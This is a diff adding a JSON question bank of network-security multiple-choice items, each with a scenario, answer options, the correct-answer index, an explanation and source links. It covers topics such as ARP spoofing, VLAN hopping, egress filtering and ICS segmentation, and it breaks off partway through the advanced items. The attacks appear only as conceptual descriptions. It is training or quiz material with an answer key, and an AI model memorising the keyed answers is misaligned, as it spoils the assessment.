@@ -1,0 +1,2001 @@
+{
+  "questions": {
+    "network-security_beginner": [
+      {
+        "title": "Understanding MAC Addresses",
+        "context": "A network administrator is troubleshooting a connectivity issue. They are looking at the Layer 2 information for devices connected to a switch. Each device has a unique hardware identifier burned into its network interface card (NIC).",
+        "question": "What is this unique Layer 2 hardware address called?",
+        "options": [
+          "IP Address",
+          "Subnet Mask",
+          "MAC Address",
+          "Default Gateway"
+        ],
+        "correct": 2,
+        "explanation": "✓ A Media Access Control (MAC) address is a unique identifier assigned to a network interface controller (NIC) for use as a network address in communications within a network segment. It operates at Layer 2 (the Data Link Layer) of the OSI model.\n✗ An IP address is a Layer 3 logical address. Subnet masks and default gateways are also part of Layer 3 IP networking.",
+        "learningPoints": [
+          "MAC addresses are unique hardware identifiers for network interfaces.",
+          "They operate at Layer 2 of the OSI model.",
+          "Switches use MAC addresses to forward frames to the correct device on a local network."
+        ],
+        "sources": [
+          "https://www.comptia.org/content/guides/what-is-a-mac-address"
+        ],
+        "difficulty": "beginner",
+        "domain": "network-security"
+      },
+      {
+        "title": "TCP vs. UDP",
+        "context": "A developer is choosing a transport protocol for two different applications. One is a video streaming service where speed is critical and a few dropped frames are acceptable. The other is a file transfer service where every single piece of data must arrive intact.",
+        "question": "Which protocol is best suited for the video streaming service?",
+        "options": [
+          "TCP, because it is connection-oriented.",
+          "UDP, because it is connectionless and faster.",
+          "TCP, because it has lower overhead.",
+          "UDP, because it guarantees delivery."
+        ],
+        "correct": 1,
+        "explanation": "✓ The User Datagram Protocol (UDP) is a connectionless protocol with low overhead. It prioritizes speed over reliability, making it ideal for real-time applications like video streaming or online gaming where losing a small amount of data is preferable to delaying the entire stream.\n✗ Transmission Control Protocol (TCP) is connection-oriented and guarantees delivery, but this reliability comes with higher overhead, making it slower. It would be used for the file transfer service.",
+        "learningPoints": [
+          "UDP is a connectionless, low-overhead protocol that prioritizes speed.",
+          "TCP is a connection-oriented protocol that guarantees data delivery.",
+          "Choose the right transport protocol based on the application's needs for speed vs. reliability."
+        ],
+        "sources": [
+          "https://www.cloudflare.com/learning/ddos/glossary/user-datagram-protocol-udp/"
+        ],
+        "difficulty": "beginner",
+        "domain": "network-security"
+      },
+      {
+        "title": "Purpose of ARP",
+        "context": "A computer with IP address 192.168.1.10 wants to send a packet to another computer on the same local network with IP address 192.168.1.20. To send the data over the Ethernet, it needs to know the hardware address of the destination.",
+        "question": "What protocol is used to resolve the IP address 192.168.1.20 to its corresponding MAC address?",
+        "options": [
+          "DHCP (Dynamic Host Configuration Protocol)",
+          "DNS (Domain Name System)",
+          "ARP (Address Resolution Protocol)",
+          "ICMP (Internet Control Message Protocol)"
+        ],
+        "correct": 2,
+        "explanation": "✓ The Address Resolution Protocol (ARP) is used to discover the link layer address, such as a MAC address, associated with a given internet layer address, typically an IPv4 address. The computer sends an ARP request to the broadcast MAC address, and the host with the matching IP address replies with its MAC address.\n✗ DNS resolves domain names to IPs. DHCP assigns IPs to hosts. ICMP is used for diagnostic messages.",
+        "learningPoints": [
+          "ARP maps Layer 3 (IP) addresses to Layer 2 (MAC) addresses on a local network.",
+          "ARP is a critical function for local network communication.",
+          "Devices maintain an ARP cache of recently resolved addresses."
+        ],
+        "sources": [
+          "https://www.cloudflare.com/learning/ddos/glossary/address-resolution-protocol-arp/"
+        ],
+        "difficulty": "beginner",
+        "domain": "network-security"
+      },
+      {
+        "title": "Hub vs. Switch",
+        "context": "An old office network is being upgraded. The current device that connects all the computers simply receives a packet on one port and broadcasts it out to all other ports, causing frequent data collisions and slow performance.",
+        "question": "What device is being replaced, and what is the more intelligent device that will replace it?",
+        "options": [
+          "Replacing a router with a switch.",
+          "Replacing a hub with a switch.",
+          "Replacing a switch with a hub.",
+          "Replacing a firewall with a router."
+        ],
+        "correct": 1,
+        "explanation": "✓ A hub is a simple Layer 1 device that broadcasts all incoming traffic to all ports, leading to inefficiency and collisions. A switch is a more intelligent Layer 2 device that learns the MAC addresses of connected devices and forwards traffic only to the specific port the destination device is on. This greatly improves performance and security.\n✗ The scenario clearly describes the behavior of a hub. Replacing it with a switch is the standard upgrade.",
+        "learningPoints": [
+          "A hub is a Layer 1 device that broadcasts traffic to all ports.",
+          "A switch is a Layer 2 device that intelligently forwards traffic based on MAC addresses.",
+          "Switches are more secure and efficient than hubs."
+        ],
+        "sources": [
+          "https://www.cisco.com/c/en/us/solutions/small-business/resource-center/networking/network-switch-vs-hub.html"
+        ],
+        "difficulty": "beginner",
+        "domain": "network-security"
+      },
+      {
+        "title": "Wi-Fi SSID",
+        "context": "A user wants to connect their laptop to the wireless network at a coffee shop. They open their Wi-Fi settings and see a list of available networks, such as 'CoffeeShop_Guest', 'Free_WiFi', and 'Local_Library'.",
+        "question": "What is the technical term for the names of these wireless networks?",
+        "options": [
+          "BSSID (Basic Service Set Identifier)",
+          "SSID (Service Set Identifier)",
+          "MAC Address",
+          "IP Address"
+        ],
+        "correct": 1,
+        "explanation": "✓ The Service Set Identifier (SSID) is the human-readable name of a wireless local area network (WLAN). It is the name that users see when they scan for available Wi-Fi networks.\n✗ The BSSID is the MAC address of the wireless access point. MAC and IP addresses are identifiers for devices, not the network name itself.",
+        "learningPoints": [
+          "The SSID is the public name of a Wi-Fi network.",
+          "It's important to choose a unique and non-descriptive SSID for security.",
+          "Hiding an SSID is not a strong security measure."
+        ],
+        "sources": [
+          "https://www.cisco.com/c/en/us/support/docs/smb/wireless/what-is-a-service-set-identifier-ssid.html"
+        ],
+        "difficulty": "beginner",
+        "domain": "network-security"
+      },
+      {
+        "title": "Function of ICMP Ping",
+        "context": "A network technician suspects a server at IP address 10.0.0.5 is offline. They open a command prompt and type a command to send a special message to the server to see if it responds.",
+        "question": "What protocol is the 'ping' command using to test for connectivity?",
+        "options": [
+          "TCP (Transmission Control Protocol)",
+          "UDP (User Datagram Protocol)",
+          "ARP (Address Resolution Protocol)",
+          "ICMP (Internet Control Message Protocol)"
+        ],
+        "correct": 3,
+        "explanation": "✓ The ping utility uses the Internet Control Message Protocol (ICMP). It sends an 'Echo Request' message to the target host and waits for an 'Echo Reply'. This is a fundamental way to test basic network connectivity and reachability between two devices.\n✗ TCP and UDP are transport protocols for application data. ARP resolves IP to MAC addresses.",
+        "learningPoints": [
+          "ICMP is used for network diagnostics and control messages.",
+          "The 'ping' command uses ICMP Echo Request/Reply messages.",
+          "Firewalls can be configured to block ICMP traffic."
+        ],
+        "sources": [
+          "https://www.cloudflare.com/learning/ddos/glossary/internet-control-message-protocol-icmp/"
+        ],
+        "difficulty": "beginner",
+        "domain": "network-security"
+      },
+      {
+        "title": "Basic Network Segmentation with VLANs",
+        "context": "A company wants to separate the computers used by the Accounting department from the computers used by the Engineering department, even though they are all connected to the same physical switch. The goal is to prevent a user in one department from easily accessing resources in the other.",
+        "question": "What technology allows for the creation of separate logical networks on the same physical switch?",
+        "options": [
+          "VPN (Virtual Private Network)",
+          "NAT (Network Address Translation)",
+          "VLAN (Virtual Local Area Network)",
+          "DHCP (Dynamic Host Configuration Protocol)"
+        ],
+        "correct": 2,
+        "explanation": "✓ A Virtual Local Area Network (VLAN) allows a network administrator to partition a single physical switch into multiple, logically separate networks. Devices in one VLAN cannot communicate directly with devices in another VLAN without a router (a Layer 3 device) to route traffic between them. This is a basic form of network segmentation for security and traffic management.\n✗ VPNs create secure tunnels over public networks. NAT translates private IPs to public IPs. DHCP assigns IP configurations.",
+        "learningPoints": [
+          "VLANs create logically separate broadcast domains on a single switch.",
+          "They are a fundamental tool for network segmentation.",
+          "Traffic between VLANs must be routed by a Layer 3 device."
+        ],
+        "sources": [
+          "https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst2960/software/release/12-2_53_se/configuration/guide/2960scg/swvlan.html"
+        ],
+        "difficulty": "beginner",
+        "domain": "network-security"
+      },
+      {
+        "title": "Purpose of Network Access Control (NAC)",
+        "context": "A university wants to ensure that only students and staff with up-to-date antivirus software can connect to the campus Wi-Fi. If a student's laptop has outdated antivirus, it should be placed in a quarantine network with limited access until it is updated.",
+        "question": "What type of security solution is designed to enforce these kinds of policies before granting network access?",
+        "options": [
+          "A firewall",
+          "A proxy server",
+          "Network Access Control (NAC)",
+          "An Intrusion Detection System (IDS)"
+        ],
+        "correct": 2,
+        "explanation": "✓ Network Access Control (NAC) solutions are designed to enforce security policies on devices before they are permitted to access network resources. NAC can check for things like antivirus status, patch levels, and user authentication, and then grant, deny, or quarantine the device based on its compliance with policy.\n✗ A firewall controls traffic between networks. A proxy server mediates requests to other servers. An IDS detects but does not enforce policy.",
+        "learningPoints": [
+          "NAC provides visibility and policy enforcement for devices connecting to a network.",
+          "It can check the security posture (health) of a device before granting access.",
+          "NAC is a key component in securing networks with many BYOD or guest devices."
+        ],
+        "sources": [
+          "https://www.fortinet.com/resources/cyberglossary/network-access-control",
+          "https://en.wikipedia.org/wiki/Network_access_control",
+          "https://www.illumio.com/resource-center/what-is-nac",
+          "https://www.deda.tech/en/insight/network-access-control",
+          "https://www.checkpoint.com/cyber-hub/network-security/what-is-network-access-control-nac/"
+        ],
+        "difficulty": "beginner",
+        "domain": "network-security"
+      },
+      {
+        "title": "Physical Security of Network Devices",
+        "context": "A company has all its important servers and network switches in a single room. An auditor points out that the door to the room is unlocked and anyone could walk in and unplug a device.",
+        "question": "What essential security principle is being violated?",
+        "options": [
+          "Data encryption",
+          "Physical security",
+          "Software patching",
+          "Password complexity"
+        ],
+        "correct": 1,
+        "explanation": "✓ Physical security is a fundamental layer of network security. If an unauthorized person can gain physical access to a network device or server, they can easily disrupt services, steal data by removing drives, or bypass other security controls. Securing devices in locked rooms or server racks is a critical first step.\n✗ The other options are important security controls, but they do not address the specific issue of unauthorized physical access to equipment.",
+        "learningPoints": [
+          "Physical security is the foundation of information security.",
+          "Controls include locked doors, server cages, and access control systems.",
+          "An attacker with physical access can often bypass most other logical security controls."
+        ],
+        "sources": [
+          "https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/physical-security"
+        ],
+        "difficulty": "beginner",
+        "domain": "network-security"
+      },
+      {
+        "title": "OSI Model Layers",
+        "context": "A network security analyst is describing how data moves through a network. They explain that routers operate at the 'Network' layer to make decisions based on IP addresses, while switches operate at the 'Data Link' layer using MAC addresses.",
+        "question": "What standardized model are they referring to that describes these layers of network function?",
+        "options": [
+          "The TCP/IP Model",
+          "The OSI (Open Systems Interconnection) Model",
+          "The Cyber Kill Chain",
+          "The MITRE ATT&CK Framework"
+        ],
+        "correct": 1,
+        "explanation": "✓ The OSI Model is a conceptual framework that standardizes the functions of a telecommunication or computing system into seven abstract layers. Layer 3 is the Network Layer (IP addresses, routing) and Layer 2 is the Data Link Layer (MAC addresses, switching). It provides a common language for describing network functions.\n✗ The TCP/IP model is a more practical, four-layer model but the seven-layer description points to OSI. The Kill Chain and ATT&CK are models for intrusion analysis, not network function.",
+        "learningPoints": [
+          "The OSI Model describes seven layers of network communication.",
+          "Understanding the OSI model is fundamental to network troubleshooting and security.",
+          "Different security devices operate at different layers of the model."
+        ],
+        "sources": [
+          "https://www.imperva.com/learn/application-security/osi-model/"
+        ],
+        "difficulty": "beginner",
+        "domain": "network-security"
+      }
+    ],
+    "network-security_intermediate": [
+      {
+        "title": "VLAN Hopping Attack",
+        "context": "An attacker connects their laptop to an open port on a switch in an office lobby, which is assigned to the 'Guest' VLAN (VLAN 10). Their goal is to gain access to the 'Server' VLAN (VLAN 20). The attacker sends specially crafted frames that trick the switch into thinking their laptop is another switch.",
+        "question": "What type of attack is being attempted?",
+        "options": [
+          "ARP spoofing",
+          "MAC flooding",
+          "VLAN hopping",
+          "A Smurf attack"
+        ],
+        "correct": 2,
+        "explanation": "✓ VLAN hopping is an attack method used to gain access to traffic on other VLANs that would normally not be accessible. In a 'switch spoofing' attack, the attacker's machine emulates a switch and takes advantage of misconfigured trunk ports to gain access to all VLANs allowed on the trunk.\n✗ ARP spoofing involves falsifying MAC addresses. MAC flooding overwhelms the switch's MAC table. A Smurf attack is a type of DDoS attack using ICMP.",
+        "learningPoints": [
+          "VLAN hopping exploits misconfigured switch ports to bypass layer 2 segmentation.",
+          "Properly configuring trunk ports (e.g., disabling DTP, setting a native VLAN) is a key mitigation.",
+          "This attack allows an attacker to move from a less secure network segment to a more secure one."
+        ],
+        "sources": [
+          "https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst3560/software/release/12-2_52_se/configuration/guide/3560scg/swvlan.html#pgfId-1099681"
+        ],
+        "difficulty": "intermediate",
+        "domain": "network-security"
+      },
+      {
+        "title": "ARP Spoofing Attack",
+        "context": "On a local network, User A (192.168.1.10) wants to send data to the router (192.168.1.1). An attacker (192.168.1.50) sends forged ARP reply messages to User A, claiming that the MAC address for 192.168.1.1 is the attacker's own MAC address. User A's computer updates its ARP cache with this false information.",
+        "question": "What is the result of this ARP spoofing attack?",
+        "options": [
+          "User A's computer will shut down.",
+          "The attacker will be disconnected from the network.",
+          "All of User A's outbound internet traffic will be sent to the attacker's computer first.",
+          "The entire network will experience a denial of service."
+        ],
+        "correct": 2,
+        "explanation": "✓ ARP spoofing (or ARP cache poisoning) allows an attacker to intercept traffic between two devices on a local network. By poisoning User A's ARP cache, the attacker has tricked User A's computer into sending traffic destined for the router to the attacker instead. This enables a Man-in-the-Middle (MitM) attack where the attacker can view or modify the traffic before forwarding it to the real router.\n✗ This attack is stealthy and does not directly cause a shutdown or network-wide DoS. Its goal is interception.",
+        "learningPoints": [
+          "ARP spoofing is a Man-in-the-Middle attack on the local network.",
+          "It works by sending forged ARP messages to poison the ARP cache of victims.",
+          "Dynamic ARP Inspection (DAI) is a security feature on switches to mitigate this attack."
+        ],
+        "sources": [
+          "https://www.imperva.com/learn/application-security/arp-spoofing/"
+        ],
+        "difficulty": "intermediate",
+        "domain": "network-security"
+      },
+      {
+        "title": "Deep Packet Inspection (DPI)",
+        "context": "A company has a standard firewall that blocks traffic based on source/destination IP addresses and ports. However, they want to implement a policy to block specific applications like BitTorrent, regardless of the port it uses. They need a technology that can analyze the actual content of the data packets.",
+        "question": "What technology enables a firewall to perform this kind of application-aware filtering?",
+        "options": [
+          "Stateless Packet Filtering",
+          "Network Address Translation (NAT)",
+          "Deep Packet Inspection (DPI)",
+          "Virtual Private Networking (VPN)"
+        ],
+        "correct": 2,
+        "explanation": "✓ Deep Packet Inspection (DPI) is an advanced method of examining and managing network traffic. Unlike traditional firewalls that only look at packet headers (IPs and ports), DPI inspects the data part (the payload) of a packet. This allows it to identify the specific application or protocol being used and enforce more granular policies.\n✗ Stateless filtering and NAT do not inspect the packet payload. A VPN encrypts the payload, making DPI more difficult.",
+        "learningPoints": [
+          "DPI inspects the payload of packets, not just the headers.",
+          "It is used in Next-Generation Firewalls (NGFW) and Intrusion Prevention Systems (IPS).",
+          "DPI enables application-level awareness and control."
+        ],
+        "sources": [
+          "https://www.cisco.com/c/en/us/products/security/what-is-deep-packet-inspection.html"
+        ],
+        "difficulty": "intermediate",
+        "domain": "network-security"
+      },
+      {
+        "title": "Role of a Network Honeypot",
+        "context": "A security team deploys a server on their network that is intentionally configured with vulnerabilities. This server is not used for any legitimate business purpose, but it is heavily monitored. The goal is to see if any attackers will target it.",
+        "question": "What is the primary purpose of deploying such a server?",
+        "options": [
+          "To serve as a backup for production systems.",
+          "To act as a load balancer for web traffic.",
+          "To act as a honeypot to attract and study attackers.",
+          "To perform vulnerability scans on the internal network."
+        ],
+        "correct": 2,
+        "explanation": "✓ A honeypot is a security mechanism that creates a decoy to lure attackers. Since the honeypot has no legitimate production value, any traffic to it is inherently suspicious. It is used to distract attackers from real targets and to allow the security team to study their methods (TTPs - Tactics, Techniques, and Procedures) in a controlled environment.\n✗ The other options describe entirely different network functions. A honeypot is specifically a decoy and analysis tool.",
+        "learningPoints": [
+          "Honeypots are decoy systems used to detect and analyze attacks.",
+          "They can be low-interaction or high-interaction, simulating varying levels of realism.",
+          "Any interaction with a honeypot is a strong indicator of malicious activity."
+        ],
+        "sources": [
+          "https://www.comptia.org/content/guides/what-is-a-honeypot"
+        ],
+        "difficulty": "intermediate",
+        "domain": "network-security"
+      },
+      {
+        "title": "Switch Port Security",
+        "context": "To prevent unauthorized devices from connecting to the network, a network administrator configures a switch port so that only the first MAC address seen on that port is allowed. If a different device is plugged into that port, the port automatically shuts down.",
+        "question": "What switch feature is being described?",
+        "options": [
+          "VLAN Tagging",
+          "Port Security",
+          "Spanning Tree Protocol (STP)",
+          "Link Aggregation (LACP)"
+        ],
+        "correct": 1,
+        "explanation": "✓ Port security is a Layer 2 feature on switches that allows an administrator to restrict a port's usage based on MAC addresses. It can be configured to allow a specific number of MACs (or just one), to learn MAC addresses dynamically ('sticky MACs'), and to define an action (like shutdown or restrict) if a violation occurs. This is a common method to prevent MAC spoofing and unauthorized device connections.\n✗ VLANs segment the network. STP prevents loops. LACP bundles links together.",
+        "learningPoints": [
+          "Port security is a feature to control access to a switch port based on MAC addresses.",
+          "It can be used to prevent unauthorized devices from connecting to the network.",
+          "Violation actions can be configured, such as shutting down the port."
+        ],
+        "sources": [
+          "https://www.cisco.com/c/en/us/td/docs/switches/lan/catalyst2960/software/release/12-2_55_se/configuration/guide/2960_scg/swacl.html#1040582"
+        ],
+        "difficulty": "intermediate",
+        "domain": "network-security"
+      },
+      {
+        "title": "IPv6 Security Considerations",
+        "context": "A network is migrating to IPv6. An administrator notices that their existing firewall rules and security tools, which are configured for IPv4, are not inspecting the new IPv6 traffic. They are concerned that this creates a blind spot.",
+        "question": "What is a primary security challenge when introducing IPv6 into an IPv4 network?",
+        "options": [
+          "IPv6 is inherently less secure than IPv4.",
+          "IPv6 addresses are too long to be logged.",
+          "Security controls must be explicitly configured to handle IPv6 traffic, otherwise it may be tunneled or bypassed.",
+          "IPv6 does not support encryption."
+        ],
+        "correct": 2,
+        "explanation": "✓ A major challenge is that IPv6 is often enabled by default on operating systems and can operate in parallel with IPv4. If security appliances like firewalls, IPS, and proxies are not configured to inspect IPv6 traffic, it can create a 'shadow network' that bypasses existing controls. Attackers can exploit this to exfiltrate data or communicate with C2 servers over unmonitored IPv6 channels.\n✗ IPv6 is not inherently less secure and has some security improvements (like built-in IPsec support). Addresses can be logged, and it supports encryption.",
+        "learningPoints": [
+          "IPv6 and IPv4 can run concurrently on the same network.",
+          "Security policies and tools must be dual-stack aware to avoid creating blind spots.",
+          "Attackers can use unmonitored IPv6 traffic to bypass IPv4-only security controls."
+        ],
+        "sources": [
+          "https://www.cisa.gov/uscert/ncas/alerts/TA11-213A"
+        ],
+        "difficulty": "intermediate",
+        "domain": "network-security"
+      },
+      {
+        "title": "Defense Against MAC Flooding",
+        "context": "An attacker connects a device to a network switch and begins sending a massive number of Ethernet frames, each with a different, random source MAC address. The goal is to overwhelm the switch's memory that stores the mapping of MAC addresses to ports.",
+        "question": "If this MAC flooding attack is successful, how will the switch behave?",
+        "options": [
+          "It will shut down all ports.",
+          "It will forward traffic only to the default gateway.",
+          "It will fail-open, acting like a hub and broadcasting all traffic to all ports.",
+          "It will block the attacker's port."
+        ],
+        "correct": 2,
+        "explanation": "✓ A switch's Content Addressable Memory (CAM) table has a finite size. A MAC flooding attack aims to fill this table with fake MAC addresses. When the table is full, the switch can no longer learn new addresses. To continue functioning, it enters a 'fail-open' mode where it broadcasts all incoming packets to every port, just like a hub. This allows an attacker to sniff all traffic on the local network segment.\n✗ While port security could block the port, the default behavior of the switch itself when the CAM table is full is to broadcast.",
+        "learningPoints": [
+          "MAC flooding attacks target the CAM table of a switch.",
+          "A successful attack forces the switch to act like a hub.",
+          "This allows an attacker to capture traffic intended for other devices."
+        ],
+        "sources": [
+          "https://owasp.org/www-community/attacks/MAC_Flooding"
+        ],
+        "difficulty": "intermediate",
+        "domain": "network-security"
+      }
+    ],
+    "network-security_advanced": [
+      {
+        "title": "Egress Filtering Importance",
+        "context": "A malware-infected host inside a corporate network begins communicating with its command-and-control (C2) server on the internet using a non-standard port (TCP 8888). The company's firewall rules primarily focus on blocking inbound traffic but allow most outbound traffic.",
+        "question": "What security practice would be most effective at preventing this C2 communication?",
+        "options": [
+          "Ingress filtering",
+          "Network Address Translation (NAT)",
+          "Egress filtering",
+          "Quality of Service (QoS)"
+        ],
+        "correct": 2,
+        "explanation": "✓ Egress filtering is the practice of monitoring and potentially restricting the flow of information outbound from one network to another. By implementing a default-deny policy for outbound traffic and only allowing connections on specific, approved ports (like 80, 443, 53), the company could have blocked the malware's C2 communication on the non-standard port. This is a critical control for preventing data exfiltration and malware callbacks.\n✗ Ingress filtering controls inbound traffic. NAT translates addresses. QoS prioritizes traffic.",
+        "learningPoints": [
+          "Egress filtering controls outbound network traffic.",
+          "It is a crucial defense against data exfiltration and C2 communication.",
+          "A best practice is to deny all outbound traffic by default and only allow what is explicitly required."
+        ],
+        "sources": [
+          "https://www.cisa.gov/uscert/ncas/tips/ST04-019"
+        ],
+        "difficulty": "advanced",
+        "domain": "network-security"
+      },
+      {
+        "title": "Cloud Access Security Broker (CASB)",
+        "context": "A company is heavily using cloud services like Microsoft 365, Salesforce, and Box. The security team is struggling to enforce consistent security policies, such as data loss prevention (DLP) and threat protection, across all these different platforms.",
+        "question": "What type of security solution acts as an intermediary to enforce security policies between cloud service users and cloud service providers?",
+        "options": [
+          "A traditional web proxy",
+          "A host-based firewall",
+          "A Cloud Access Security Broker (CASB)",
+          "A VPN concentrator"
+        ],
+        "correct": 2,
+        "explanation": "✓ A CASB is a security policy enforcement point that can be placed between cloud service consumers and cloud service providers to combine and interject enterprise security policies as the cloud-based resources are accessed. CASBs consolidate multiple types of security policy enforcement, including authentication, single sign-on, authorization, credential mapping, device profiling, encryption, tokenization, logging, alerting, malware detection/prevention, and more.\n✗ While a proxy has some similar functions, a CASB is specifically designed to be aware of and integrate with SaaS applications to provide much deeper visibility and control.",
+        "learningPoints": [
+          "A CASB provides visibility and control over data in cloud applications.",
+          "It acts as a policy enforcement point between users and cloud services.",
+          "CASBs are key for data loss prevention, threat protection, and compliance in the cloud."
+        ],
+        "sources": [
+          "https://www.mcafee.com/enterprise/en-us/security-awareness/cloud/what-is-a-casb.html"
+        ],
+        "difficulty": "advanced",
+        "domain": "network-security"
+      },
+      {
+        "title": "NetFlow Analysis for Security",
+        "context": "An incident response team is investigating a potential data breach. They do not have a full packet capture of the event, but they do have NetFlow records from the company's core routers. The records show a sustained, large data transfer from an internal database server to an unknown IP address in Eastern Europe over several hours.",
+        "question": "What is the primary value of NetFlow data in this security context?",
+        "options": [
+          "It provides the full content of the exfiltrated files.",
+          "It provides metadata about the connection (source/destination IP, ports, bytes transferred) which can serve as evidence of exfiltration.",
+          "It encrypts all network traffic to prevent future breaches.",
+          "It blocks the connection in real-time."
+        ],
+        "correct": 1,
+        "explanation": "✓ NetFlow (and similar technologies like IPFIX) provides traffic metadata, not the full packet content. While it can't show *what* data was stolen, it provides a crucial record of the communication itself: who talked to whom, when, for how long, and how much data was transferred. This is often sufficient to identify compromised hosts, map lateral movement, and confirm data exfiltration, making it a powerful tool for incident response and threat hunting.\n✗ NetFlow is a monitoring technology; it does not contain packet payloads, encrypt, or block traffic.",
+        "learningPoints": [
+          "NetFlow provides valuable metadata about network conversations.",
+          "It is used for security analysis, incident response, and threat hunting.",
+          "While it doesn't capture packet content, it provides critical context about traffic flows."
+        ],
+        "sources": [
+          "https://www.cisco.com/c/en/us/products/ios-nx-os-software/ios-netflow/index.html"
+        ],
+        "difficulty": "advanced",
+        "domain": "network-security"
+      },
+      {
+        "title": "Encrypted Traffic Analysis (ETA)",
+        "context": "A security team is concerned that attackers are hiding their activities within encrypted TLS traffic, bypassing their traditional IDS/IPS signatures. They cannot legally or practically perform TLS decryption on all traffic. They need a way to detect threats in encrypted traffic without decrypting it.",
+        "question": "What emerging security technique analyzes metadata and patterns within encrypted traffic to identify potential threats?",
+        "options": [
+          "DNS Sinkholing",
+          "Full Packet Capture",
+          "TLS Decryption (Break and Inspect)",
+          "Encrypted Traffic Analysis (ETA)"
+        ],
+        "correct": 3,
+        "explanation": "✓ Encrypted Traffic Analysis (ETA) is a method of detecting malware and threats in encrypted traffic without decryption. It relies on machine learning and statistical analysis of metadata, such as the sequence of packet lengths and times, TLS handshake metadata (e.g., cipher suites), and DNS context. This allows it to spot anomalies that suggest malicious activity, even when the payload is encrypted.\n✗ TLS Decryption is the alternative but has privacy and overhead concerns. Full packet capture would still be encrypted. DNS sinkholing is a different mitigation technique.",
+        "learningPoints": [
+          "ETA enables threat detection within encrypted traffic without needing to decrypt it.",
+          "It uses machine learning to analyze traffic metadata and patterns.",
+          "This helps address the security blind spot created by widespread encryption."
+        ],
+        "sources": [
+          "https://blogs.cisco.com/security/encrypted-traffic-analysis-a-primer"
+        ],
+        "difficulty": "advanced",
+        "domain": "network-security"
+      },
+      {
+        "title": "Network Deception Technology",
+        "context": "To enhance its threat detection capabilities, a company deploys a system that creates a fake environment of decoy servers, endpoints, and network services that mimic their real production environment. The system is designed to trick attackers into revealing themselves.",
+        "question": "What is this advanced defense strategy called?",
+        "options": [
+          "Vulnerability Management",
+          "Penetration Testing",
+          "Network Deception Technology",
+          "Network Access Control"
+        ],
+        "correct": 2,
+        "explanation": "✓ Network Deception Technology is an evolution of the honeypot concept. It involves creating a dynamic, scalable, and believable layer of deception across the network. This includes decoys (fake assets), lures (breadcrumbs on real assets pointing to decoys), and a centralized management console. When an attacker interacts with any part of the deception fabric, a high-fidelity alert is generated, providing early warning of a breach.\n✗ The other options are standard security practices, but they do not involve creating an active, hostile environment for attackers.",
+        "learningPoints": [
+          "Deception technology creates a layer of decoys and lures to trick attackers.",
+          "It provides high-fidelity alerts, as no legitimate user should interact with deception assets.",
+          "It is a proactive defense designed to detect post-breach activity like lateral movement."
+        ],
+        "sources": [
+          "https://www.paloaltonetworks.com/cyberpedia/what-is-deception-technology"
+        ],
+        "difficulty": "advanced",
+        "domain": "network-security"
+      },
+      {
+        "title": "Kubernetes Network Security",
+        "context": "A DevOps team is deploying applications in a Kubernetes cluster. They need to enforce a security policy that states 'Pods with the label app=backend can only accept traffic from Pods with the label app=frontend on TCP port 8080'.",
+        "question": "What native Kubernetes resource is used to define and enforce these kinds of granular, intra-cluster firewall rules?",
+        "options": [
+          "Services",
+          "Ingress Controllers",
+          "NetworkPolicy",
+          "ConfigMaps"
+        ],
+        "correct": 2,
+        "explanation": "✓ Kubernetes NetworkPolicy objects are used to control the traffic flow at the IP address or port level (OSI Layer 3 or 4) between pods in a cluster. They are a fundamental tool for implementing micro-segmentation and a Zero Trust model within a Kubernetes environment, allowing developers to define which pods can communicate with each other.\n✗ Services and Ingress expose applications, but do not enforce security rules between pods. ConfigMaps store configuration data.",
+        "learningPoints": [
+          "NetworkPolicy is the native Kubernetes resource for implementing micro-segmentation.",
+          "Policies use labels to select pods and define ingress and egress rules.",
+          "A Container Network Interface (CNI) plugin that supports NetworkPolicy (like Calico or Cilium) must be installed in the cluster."
+        ],
+        "sources": [
+          "https://kubernetes.io/docs/concepts/services-networking/network-policies/"
+        ],
+        "difficulty": "advanced",
+        "domain": "network-security"
+      },
+      {
+        "title": "API Security Gateway",
+        "context": "A company exposes numerous backend microservices to its mobile and web applications via APIs. They need a centralized point to handle authentication, rate limiting, and traffic monitoring for all API calls before they reach the backend services.",
+        "question": "What component of a modern network architecture is designed to serve this function?",
+        "options": [
+          "A database server",
+          "An API Security Gateway",
+          "A content delivery network (CDN)",
+          "An email server"
+        ],
+        "correct": 1,
+        "explanation": "✓ An API Gateway acts as a reverse proxy to accept all application programming interface (API) calls, aggregate the various services required to fulfill them, and return the appropriate result. A key function of an API Gateway is to provide security by handling tasks like authentication (e.g., OAuth2, API keys), rate limiting to prevent DoS attacks, and logging/monitoring of all API traffic.\n✗ The other options serve completely different purposes.",
+        "learningPoints": [
+          "API Gateways are a critical security control for microservices architectures.",
+          "They centralize common concerns like authentication, rate limiting, and logging.",
+          "They protect backend services from direct exposure to the internet."
+        ],
+        "sources": [
+          "https://www.redhat.com/en/topics/api/what-is-an-api-gateway"
+        ],
+        "difficulty": "advanced",
+        "domain": "network-security"
+      },
+      {
+        "title": "SCADA/ICS Network Security",
+        "context": "An engineer is designing the network for a power plant. The Industrial Control Systems (ICS) that operate the plant machinery must be protected from threats originating from the corporate IT network. A key goal is to create a buffer zone between the two networks.",
+        "question": "What is a standard architectural practice for securely connecting an IT network to a SCADA/ICS network?",
+        "options": [
+          "Directly connecting the IT and ICS networks on the same VLAN.",
+          "Using a Demilitarized Zone (DMZ) with firewalls between the IT and ICS networks.",
+          "Allowing all traffic to flow freely between the networks.",
+          "Connecting the ICS network directly to the public internet."
+        ],
+        "correct": 1,
+        "explanation": "✓ Securing ICS environments requires strict network segmentation. A common and recommended architecture, often based on the Purdue Model, is to use a DMZ. This is an isolated network segment that sits between the corporate (IT) network and the control (OT) network. Firewalls control traffic into and out of the DMZ, ensuring that no direct communication path exists between the IT and OT networks and that only specifically allowed and inspected traffic can pass through.\n✗ The other options represent highly insecure practices that would put the critical infrastructure at significant risk.",
+        "learningPoints": [
+          "Strict network segmentation is critical for ICS/SCADA security.",
+          "A DMZ is used to create a secure buffer between IT and OT (Operational Technology) networks.",
+          "Direct communication between the corporate network and the control network should be prohibited."
+        ],
+        "sources": [
+          "https://www.cisa.gov/uscert/sites/default/files/recommended_practices/RP_IT-OT_Alignment_S508C.pdf",
+          "https://www.newevol.com/blog/best-practices-to-protect-industrial-control-systems-ics",
+          "https://www.altimetrik.com/insights/blog/securing-ics-security-and-scada-cyber-resilience-a-comprehensive-guide",
+          "https://www.readynez.com/en/blog/understanding-ics-scada-security-essentials/",
+          "https://www.levelblue.com/blog/10-strategies-to-fortify-scada-system-security",
+          "https://www.dragos.com/blog/what-is-the-purdue-model-for-ics-security/",
